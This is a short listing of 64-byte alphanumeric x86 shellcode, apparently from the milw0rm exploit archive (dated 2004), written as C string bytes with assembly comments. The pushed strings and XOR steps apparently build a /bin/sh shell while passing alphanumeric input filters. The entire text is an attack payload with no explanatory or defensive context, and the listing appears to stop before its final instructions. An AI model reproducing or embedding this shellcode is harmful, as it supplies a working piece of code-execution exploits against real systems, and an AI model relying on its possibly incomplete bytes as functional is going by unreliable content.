/*--------------------------------------*/
/*   64 byte alpha-numeric shellcode    */
/*        by XORt@dallas_2600   64bytes */
/*--------------------------------------*/
     "\x6a\x30"         /* pushb $0x30       */
     "\x58"             /* pop %eax          */
     "\x34\x30"         /* xorb $0x30, %al   */
     "\x50"             /* push %eax         */
     "\x5a"             /* pop %edx          */
     "\x48"             /* dec %eax          */
     "\x66\x35\x41\x30" /* xorl $0x3041, %ax */
     "\x66\x35\x73\x4f" /* xorl $0x4f73, %ax */
     "\x50"             /* push %eax         */
     "\x52"             /* pushl %edx        */
     "\x58"             /* pop %eax          */
     "\x684J4A"         /* pushl "4J4A"      */
     "\x68PSTY"         /* pushl "PSTY"      */
     "\x68UVWa"         /* pushl "UVWa"      */
     "\x68QRPT"         /* pushl "QRPT"      */
     "\x68PTXR"         /* pushl "PTXR"      */
     "\x68binH"         /* pushl "binH"      */
     "\x68IQ50"         /* pushl "IQ50"      */
     "\x68shDY"         /* pushl "shDY"      */
     "\x68Rha0"         /* pushl "Rha0"      */
     /*--------------------------------------*/


// milw0rm.com [2004-12-22]